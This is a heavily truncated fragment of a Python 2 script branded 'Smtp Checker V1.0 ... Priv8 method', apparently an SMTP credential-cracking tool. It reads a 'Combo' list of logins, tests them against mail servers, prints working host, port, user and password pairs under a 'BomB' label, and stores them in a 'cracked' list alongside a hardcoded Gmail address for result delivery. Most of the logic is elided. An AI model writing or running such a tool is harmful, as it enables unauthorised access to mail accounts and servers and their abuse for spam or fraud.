...
def logo():
 ...
 Smtp Checker V1.0    |   Priv8 method    | |  Coded by Rootinabox                           
                 With Email Delivery         
	...
	def connect(self,tupple,ssl=False):
		...
		try:
			...
			if rez[0:3]!="235" or 'fail' in rez:
				...
				s.close()
				return 0
			print '\033[93m[>] BomB \033[00m'+host+':'+port+' '+user+' '+passw
...
cracked=[]
rbads=0
email='elliotxmrrobot@gmail.com'
try:
 ...
 try:
 	inputs=open(raw_input('\033[94m[\033[92mCombo\033[94m]\033[00m '),'r').read().splitlines()
 except:
 	exit("Wrong Format ! Ex --> list.txt")
 try:
